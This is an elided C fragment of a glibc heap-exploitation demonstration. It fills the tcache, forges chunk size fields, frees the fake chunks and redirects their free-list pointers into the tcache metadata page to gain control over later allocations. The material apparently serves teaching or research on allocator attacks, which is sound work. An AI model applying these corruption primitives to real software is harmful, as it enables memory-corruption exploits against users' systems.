...
int main(void) {
	...
	// mid 与 tcache 元数据在同一页，因此可直接取页基址。
	void *tcache = (void *)((long)mid & ~0xfff);
	void *fill[7];
	for (int i = 0; i < 7; i++) {
		fill[i] = malloc(0x88);
	}
	...
	*(long *)(first - 0x18) = 0x331;
	free(first - 0x10);
	*(long *)(first - 0x8) = 0x91;
	*(long *)(last - 0x18) = 0x321;
	free(last - 0x10);
	*(long *)(last - 0x8) = 0x91;
	...
	*(unsigned long *)first = (unsigned long)(tcache + 0x200);
	*(unsigned long *)(last + 0x8) = (unsigned long)(tcache + 0x200);
